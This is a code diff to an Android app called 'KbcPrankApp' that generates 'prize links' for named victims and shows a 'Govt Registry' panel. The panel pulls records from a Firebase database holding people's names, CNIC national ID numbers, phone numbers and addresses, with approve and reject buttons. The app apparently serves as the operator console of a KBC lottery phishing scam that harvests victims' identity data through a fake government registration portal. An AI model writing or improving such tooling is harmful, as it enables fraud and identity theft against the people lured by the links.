@@ -45,7 +45,7 @@ import com.google.firebase.database.ValueEventListener
 import org.json.JSONArray
 import org.json.JSONObject
 
-// Data Models
+// Safe Data Model matching your exact web portal registry schema
 data class LocalPrankModel(
     val id: Long,
     val victimName: String,
@@ -55,10 +55,13 @@ data class LocalPrankModel(
 
 data class GovtRegistryModel(
     val id: String = "",
-    val userName: String = "",
-    val cnicOrId: String = "",
-    val status: String = "Pending",
-    val timestamp: Long = 0L
+    val name: String = "",
+    val cnic: String = "",
+    val mobile: String = "",
+    val uc: String = "",
+    val address: String = "",
+    val trxStatus: String = "Pending",
+    val timestamp: String = ""
 )
 
 class MainActivity : ComponentActivity() {
@@ -188,7 +191,13 @@ fun KbcPrankApp(
     modifier: Modifier = Modifier
 ) {
     val context = LocalContext.current
-    val realtimeDb = remember { FirebaseDatabase.getInstance().getReference("registrations") }
+    
+    // Explicitly targeting your correct Betone Live Realtime Database URL to bypass json issues
+    val realtimeDb = remember { 
+        FirebaseDatabase.getInstance("https://betone-live-default-rtdb.firebaseio.com/")
+            .getReference("registrations") 
+    }
+    
     val sharedPrefs = remember { context.getSharedPreferences("PrankPrefs", Context.MODE_PRIVATE) }
     
     var victimName by remember { mutableStateOf("") }
@@ -202,7 +211,7 @@ fun KbcPrankApp(
     val govtRegistryList = remember { mutableStateListOf<GovtRegistryModel>() }
     val processedDocIds = remember { mutableStateOf(setOf<String>()) }
 
-    // Load Local History data from SharedPreferences securely
+    // Load Local History Cache
     LaunchedEffect(Unit) {
         val savedHistory = sharedPrefs.getString("history_data", null)
         if (!savedHistory.isNullOrBlank()) {
@@ -221,7 +230,7 @@ fun KbcPrankApp(
         }
     }
 
-    // Realtime Database Listener for Live User Tracking Panel
+    // Direct Realtime Data Synchronization from registrations node
     LaunchedEffect(Unit) {
         realtimeDb.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
@@ -233,24 +242,40 @@ fun KbcPrankApp(
                 for (child in snapshot.children) {
                     try {
                         val id = child.key ?: ""
-                        val uName = child.child("name").getValue(String::class.java) 
-                            ?: child.child("userName").getValue(String::class.java) ?: ""
-                        val cnic = child.child("cnic").getValue(String::class.java) 
-                            ?: child.child("cnicOrId").getValue(String::class.java) ?: ""
-                        val currentStatus = child.child("status").getValue(String::class.java) ?: "Pending"
-                        val time = child.child("timestamp").getValue(Long::class.java) ?: 0L
+                        
+                        // Mapping exact schema strings from your web database payload
+                        val uName = child.child("name").getValue(String::class.java) ?: ""
+                        val uCnic = child.child("cnic").getValue(String::class.java) ?: ""
+                        val uMobile = child.child("mobile").getValue(String::class.java) ?: ""
+                        val uUc = child.child("uc").getValue(String::class.java) ?: ""
+                        val uAddress = child.child("address").getValue(String::class.java) ?: ""
+                        val status = child.child("trxStatus").getValue(String::class.java) ?: "Pending"
+                        val timeStr = child.child("timestamp").getValue(String::class.java) ?: ""
 
                         currentBatchIds.add(id)
-                        govtRegistryList.add(GovtRegistryModel(id, uName, cnic, currentStatus, time))
+                        
+                        govtRegistryList.add(
+                            GovtRegistryModel(
+                                id = id,
+                                name = uName,
+                                cnic = uCnic,
+                                mobile = uMobile,
+                                uc = uUc,
+                                address = uAddress,
+                                trxStatus = status,
+                                timestamp = timeStr
+                            )
+                        )
 
-                        if (!isFirstLoad && !processedDocIds.value.contains(id) && currentStatus == "Pending") {
+                        // Notification trigger for live incoming entries
+                        if (!isFirstLoad && !processedDocIds.value.contains(id) && status == "Pending") {
                             triggerLocalNotification(context, uName)
                         }
                     } catch (e: Exception) {
                         e.printStackTrace()
                     }
                 }
-                govtRegistryList.sortByDescending { it.timestamp }
+                
                 processedDocIds.value = currentBatchIds
             }
 
@@ -294,12 +319,12 @@ fun KbcPrankApp(
                         GovtRegistryItemRow(
                             entry = userEntry,
                             onApprove = {
-                                realtimeDb.child(userEntry.id).child("status").setValue("Approved")
-                                    .addOnSuccessListener { Toast.makeText(context, "Approved!", Toast.LENGTH_SHORT).show() }
+                                realtimeDb.child(userEntry.id).child("trxStatus").setValue("Approved")
+                                    .addOnSuccessListener { Toast.makeText(context, "Status Updated: Approved", Toast.LENGTH_SHORT).show() }
                             },
                             onReject = {
-                                realtimeDb.child(userEntry.id).child("status").setValue("Rejected")
-                                    .addOnSuccessListener { Toast.makeText(context, "Rejected!", Toast.LENGTH_SHORT).show() }
+                                realtimeDb.child(userEntry.id).child("trxStatus").setValue("Rejected")
+                                    .addOnSuccessListener { Toast.makeText(context, "Status Updated: Rejected", Toast.LENGTH_SHORT).show() }
                             }
                         )
                     }
@@ -383,7 +408,6 @@ fun KbcPrankApp(
                                 val newPrank = LocalPrankModel(timestampId, victimName.trim(), victimNumber.trim(), finalLink)
                                 historyList.add(0, newPrank)
 
-                                // Save locally to cache using simple string arrays
                                 val jsonArray = JSONArray()
                                 historyList.forEach {
                                     val obj = JSONObject().apply {
@@ -407,22 +431,7 @@ fun KbcPrankApp(
                             Text("Generate Prize Link")
                         }
                     }
-                    Spacer(modifier = Modifier.height(8.dp))
-                    Button(
-                        onClick = {
-                            context.startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://kbc-lottery.vercel.app/generator.html")))
-                        },
-                        modifier = Modifier.fillMaxWidth().height(48.dp),
-                        shape = RoundedCornerShape(12.dp),
-                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFDC2626))
-                    ) {
-                        Row(verticalAlignment = Alignment.CenterVertically) {
-                            Icon(Icons.Default.AccountBox, contentDescription = null)
-                            Spacer(modifier = Modifier.width(8.dp))
-                            Text("Create Registration Certificate")
-                        }
-                    }
-                    Spacer(modifier = Modifier.height(8.dp))
+                    Spacer(modifier = Modifier.height(10.dp))
                     
                     Button(
                         onClick = { showRegistryScreen = true },
@@ -433,13 +442,13 @@ fun KbcPrankApp(
                         Row(verticalAlignment = Alignment.CenterVertically) {
                             Icon(Icons.Default.List, contentDescription = null)
                             Spacer(modifier = Modifier.width(8.dp))
-                            Text("(Registry) صارف پروفائل رجسٹری")
+                            Text("(Registry) صارف پروفائل رجسٹری پینل")
                         }
                     }
                 }
             }
 
-            Text("Generated Links History", fontWeight = FontWeight.Bold, color = Color.DarkGray, modifier = Modifier.fillMaxWidth().padding(vertical = 8.dp))
+            Text("Generated Links History", modifier = Modifier.fillMaxWidth().padding(vertical = 4.dp), fontWeight = FontWeight.Bold, color = Color.Gray)
             if (historyList.isEmpty()) {
                 Box(modifier = Modifier.fillMaxWidth().weight(1f), contentAlignment = Alignment.Center) {
                     Text("No history yet. Generated links will appear here.", color = Color.Gray)
@@ -470,6 +479,7 @@ fun KbcPrankApp(
                         OutlinedButton(onClick = {
                             val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                             clipboard.setPrimaryClip(ClipData.newPlainText("KBC Link", generatedLink))
+                            Toast.makeText(context, "Copied to clipboard!", Toast.LENGTH_SHORT).show()
                         }) { Text("Copy") }
                         Button(onClick = {
                             val intent = Intent(Intent.ACTION_SEND).apply { type = "text/plain"; putExtra(Intent.EXTRA_TEXT, generatedLink) }
@@ -484,7 +494,7 @@ fun KbcPrankApp(
 
 @Composable
 fun GovtRegistryItemRow(entry: GovtRegistryModel, onApprove: () -> Unit, onReject: () -> Unit) {
-    val statusColor = when (entry.status) {
+    val statusColor = when (entry.trxStatus) {
         "Approved" -> Color(0xFF10B981)
         "Rejected" -> Color(0xFFEF4444)
         else -> Color(0xFFF59E0B)
@@ -496,23 +506,55 @@ fun GovtRegistryItemRow(entry: GovtRegistryModel, onApprove: () -> Unit, onRejec
         colors = CardDefaults.cardColors(containerColor = Color.White),
         elevation = CardDefaults.cardElevation(defaultElevation = 1.dp)
     ) {
-        Row(
-            modifier = Modifier.fillMaxWidth().padding(12.dp),
-            verticalAlignment = Alignment.CenterVertically,
-            horizontalArrangement = Arrangement.SpaceBetween
-        ) {
-            Column(modifier = Modifier.weight(1f)) {
-                Text(text = entry.userName, fontWeight = FontWeight.Bold, fontSize = 16.sp, color = Color(0xFF1F2937))
-                Text(text = "ID/CNIC: ${entry.cnicOrId}", fontSize = 13.sp, color = Color.Gray)
-                Spacer(modifier = Modifier.height(4.dp))
-                Surface(color = statusColor.copy(alpha = 0.15f), shape = RoundedCornerShape(6.dp)) {
-                    Text(text = entry.status, color = statusColor, fontSize = 11.sp, fontWeight = FontWeight.Bold, modifier = Modifier.padding(horizontal = 8.dp, vertical = 2.dp))
+        Column(modifier = Modifier.fillMaxWidth().padding(14.dp)) {
+            Row(
+                modifier = Modifier.fillMaxWidth(),
+                horizontalArrangement = Arrangement.SpaceBetween,
+                verticalAlignment = Alignment.CenterVertically
+            ) {
+                Column(modifier = Modifier.weight(1f)) {
+                    Text(text = entry.name, fontWeight = FontWeight.Bold, fontSize = 16.sp, color = Color(0xFF1F2937))
+                    Text(text = "CNIC: ${entry.cnic}", fontSize = 13.sp, color = Color.Gray)
+                    Text(text = "Phone: ${entry.mobile}", fontSize = 13.sp, color = Color.Gray)
+                    if(entry.uc.isNotBlank()) {
+                        Text(text = "UC: ${entry.uc} | Addr: ${entry.address}", fontSize = 12.sp, color = Color.DarkGray)
+                    }
+                }
+                
+                Surface(color = statusColor.copy(alpha = 0.12f), shape = RoundedCornerShape(6.dp)) {
+                    Text(
+                        text = entry.trxStatus, 
+                        color = statusColor, 
+                        fontSize = 12.sp, 
+                        fontWeight = FontWeight.Bold, 
+                        modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp)
+                    )
                 }
             }
-            if (entry.status == "Pending") {
-                Row(horizontalArrangement = Arrangement.spacedBy(4.dp)) {
-                    IconButton(onClick = onApprove) { Icon(Icons.Default.Check, contentDescription = "Approve", tint = Color(0xFF10B981)) }
-                    IconButton(onClick = onReject) { Icon(Icons.Default.Close, contentDescription = "Reject", tint = Color(0xFFEF4444)) }
+            
+            if (entry.trxStatus.equals("Pending", ignoreCase = true)) {
+                Spacer(modifier = Modifier.height(12.dp))
+                Row(
+                    modifier = Modifier.fillMaxWidth(),
+                    horizontalArrangement = Arrangement.End,
+                    verticalAlignment = Alignment.CenterVertically
+                ) {
+                    TextButton(onClick = onReject, colors = ButtonDefaults.textButtonColors(contentColor = Color(0xFFEF4444))) {
+                        Icon(Icons.Default.Close, contentDescription = null, modifier = Modifier.size(16.dp))
+                        Spacer(modifier = Modifier.width(4.dp))
+                        Text("Reject", fontWeight = FontWeight.Medium)
+                    }
+                    Spacer(modifier = Modifier.width(8.dp))
+                    Button(
+                        onClick = onApprove, 
+                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF10B981)),
+                        shape = RoundedCornerShape(8.dp),
+                        contentPadding = PaddingValues(horizontal = 12.dp, vertical = 4.dp)
+                    ) {
+                        Icon(Icons.Default.Check, contentDescription = null, modifier = Modifier.size(16.dp))
+                        Spacer(modifier = Modifier.width(4.dp))
+                        Text("Approve", fontWeight = FontWeight.Medium)
+                    }
                 }
             }
         }
@@ -541,7 +583,7 @@ fun HistoryItemRow(prank: LocalPrankModel, context: Context) {
             IconButton(onClick = {
                 val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                 clipboard.setPrimaryClip(ClipData.newPlainText("KBC Link", prank.generatedLink))
-                Toast.makeText(context, "Copied!", Toast.LENGTH_SHORT).show()
+                Toast.makeText(context, "Copied link to clipboard!", Toast.LENGTH_SHORT).show()
             }) { Icon(Icons.Default.Share, contentDescription = "Copy", tint = Color(0xFF4B5563)) }
         }
     }
